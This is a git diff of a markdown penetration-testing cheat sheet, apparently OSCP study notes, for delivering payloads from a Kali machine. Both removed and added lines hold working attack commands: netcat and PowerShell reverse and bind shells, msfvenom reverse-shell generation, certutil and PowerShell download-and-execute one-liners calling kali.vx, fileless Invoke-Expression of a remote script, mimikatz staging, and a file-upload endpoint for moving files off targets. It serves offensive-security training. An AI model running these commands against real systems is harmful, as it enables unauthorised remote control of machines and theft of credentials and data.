@@ -1,15 +1,9 @@
-# Commands for establishing connections and transfering files
-https://manpages.debian.org/bullseye/netcat-traditional/nc.1.en.html
+# 1. Setup Kali for connections
 
-## Connecting using netcat
-### Listening:
-```console
-nc -nlvp $PORT
-```
+## 1.1. Setup listener
 
-### Connecting:
 ```console
-nc -nv $ADDRESS $PORT
+nc -nlvp 4444
 ```
 
 - `-n` : numeric-only IP addresses, no DNS
@@ -17,125 +11,122 @@ nc -nv $ADDRESS $PORT
 - `-v` : verbose [use twice to be more verbose]
 - `-p` : local port number (port numbers can be individual or ranges: lo-hi [inclusive])
 
-## File transfer
-### Receiving file:
-```console
-nc -nlvp $PORT > $FILENAME_RCPT
-```
+## 1.2. Prepare payload transfer
 
-### Sending file:
-```console
-nc -np $PORT < $FILENAME_SEND
-```
+Prepare files to web server root
 
-## Bind shell
-### Listening:
-```console
-FILENAME=/bin/sh
-nc -nlvp $PORT -e $FILENAME
-```
-`-e` : specify filename to exec after connect (use with caution). See the -c option for enhanced functionality.
+☝️ Apache2 is already running with DocumentRoot at `/var/www/html`
 
-### Connecting:
-```console
-nc -nv $ADDRESS $PORT
-```
+If Kali isn't setup as web server, use `python3 -m http.server 80 &> /dev/null &` to run a web server endpoint, the web server root will be the `pwd` where the command was run
 
-## Reverse bind shell
-### Listening:
-```console
-nc -nlvp $PORT
-```
-### Connecting:
-```console
-FILENAME=/bin/sh
-nc -nv $ADDRESS $PORT -e $FILENAME
-```
-
-## Downloading files from Kali to Windows target
-### Setup http web server:
-```console
-cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
-sudo python3 -m http.server 80 &> /dev/null &
-```
-
-### Downloading:
-
-1. Using PowerShell `System.Net.WebClient`
+### Mimikatz:
 
 ```console
-set SRC_URL=http://kali.vx/mimikatz.exe
-set DST_PATH=%USERPROFILE%\mimikatz.exe
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile($env:SRC_URL,$env:DST_PATH)
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
 ```
 
-2. Using `certutil`
+### MSFVenom reverse shell TCP:
+
+☝️ omit the `x64` to generate a x86 payload
+
+Linux:
 
 ```console
-set SRC_URL=http://kali.vx/mimikatz.exe
-set DST_PATH=%USERPROFILE%\mimikatz.exe
-certutil.exe -urlcache -f -split %SRC_URL% %DST_PATH%
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f py -o /var/www/html/reverse.py
 ```
 
-## Windows reverse bind shell
-### Setup listening in kali:
+Windows:
+
 ```console
-nc -lnvp $PORT
-```
-### Powershell code:
-```console
-$ADDRESS='kali.vx'
-$PORT=443
-$CLIENT = New-Object System.Net.Sockets.TCPClient($ADDRESS,$PORT)
-$STREAM = $CLIENT.GetStream()
-[byte[]]$bytes = 0..65535|%{0}
-while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0)
-{
-$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-$SENDBACK = (iex $DATA 2>&1 | Out-String )
-$SENDBACK2 = $sendback + 'PS ' + (pwd).Path + '> '
-$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2)
-$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length)
-$STREAM.Flush()
-}
-$CLIENT.Close()
-```
-### Running powershell from cmd:
-```console
-set ADDRESS=kali.vx
-set PORT=443
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$CLIENT = New-Object System.Net.Sockets.TCPClient($env:ADDRESS,$env:PORT);$STREAM = $CLIENT.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0){$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$SENDBACK = (iex $DATA 2>&1 | Out-String );$SENDBACK2 = $sendback + 'PS ' + (pwd).Path + '> ';$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2);$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length);$STREAM.Flush()};$CLIENT.Close();"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
 ```
 
-## Windows bind shell
-### Powershell code:
+### PowerShell-based reverse shell script:
+
+Download the reverse shell scription:
+
 ```console
-$PORT=443
-$LISTENER = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$PORT)
-$LISTENER.start()
-$CLIENT = $LISTENER.AcceptTcpClient()
-$STREAM = $CLIENT.GetStream()
-[byte[]]$bytes = 0..65535|%{0}
-while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0)
-{
-$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-$SENDBACK = (iex $DATA 2>&1 | Out-String )
-$SENDBACK2 = $SENDBACK + 'PS ' + (pwd).Path + '> '
-$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2)
-$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length)
-$STREAM.Flush()
-}
-$CLIENT.Close()
-$LISTENER.Stop()
+curl -O https://raw.githubusercontent.com/joetanx/oscp/main/reverse.ps1
 ```
 
-### Running powershell from cmd:
+Edit the address and port:
+
 ```console
-set PORT=443
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$LISTENER = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$env:PORT);$LISTENER.start();$CLIENT = $LISTENER.AcceptTcpClient();$STREAM = $CLIENT.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0){$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$SENDBACK = (iex $DATA 2>&1 | Out-String );$SENDBACK2 = $SENDBACK + 'PS ' + (pwd).Path + '> ';$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2);$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length);$STREAM.Flush()};$CLIENT.Close();$LISTENER.Stop();"
+sed -i 's/<ADDRESS>/kali.vx/' reverse.ps1
+sed -i 's/<PORT>/4444/' reverse.ps1
 ```
 
-### Connecting from kali:
+# 2. Execute payloads on Windows
+
+## 2.1. Execute Windows reverse shell TCP payload
+
+### Using certutil
+
 ```console
-nc -nv $ADDRESS $PORT
+certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %USERPROFILE%\reverse.exe && %USERPROFILE%\reverse.exe
+```
+
+### Using PowerShell
+
+```console
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%USERPROFILE%\reverse.exe'); Start-Process %USERPROFILE%\reverse.exe
+```
+
+## 2.2. Execute PowerShell-based reverse shell script
+
+☝️ `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only
+
+(i.e. `DownloadFile` of the reverse shell executable and try to run it with `Invoke-Expression` will not work)
+
+```console
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/reverse.ps1')
+```
+
+# 3. Execute payloads on Linux
+
+## 3.1. Simply nc back (if netcat is installed on target machine)
+
+```console
+nc -nv 192.168.17.10 4444 -e /bin/sh
+```
+
+## 3.2. Execute Linux reverse shell TCP payload
+
+```console
+curl -O http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf
+```
+
+# 4. Uploading files to Kali
+
+## 4.1. Setup upload page on web server
+
+### Prepare uploads directory
+
+```console
+mkdir /var/www/html/uploads
+chown www-data:www-data /var/www/html/uploads
+```
+
+☝️ apache2 runs as `www-data` user, it needs write permission on the uploads directory for uploads to succeed
+
+### Prepare upload page
+
+```console
+curl -o /var/www/html/upload.php https://raw.githubusercontent.com/joetanx/oscp/main/upload.php
+```
+
+☝️ The name for the upload parameter is named as default of `file` to accommodate the PowerShell `UploadFile` method of `System.Net.WebClient` which will `POST` the file to this name
+
+## 4.2. Uploading
+
+### Using curl
+
+```console
+curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"The Little Prince.jpg" -v http://kali.vx/upload.php
+```
+
+### Using `UploadFile` method of `System.Net.WebClient`
+
+```console
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://kali.vx/upload.php','The Little Prince.jpg')
 ```
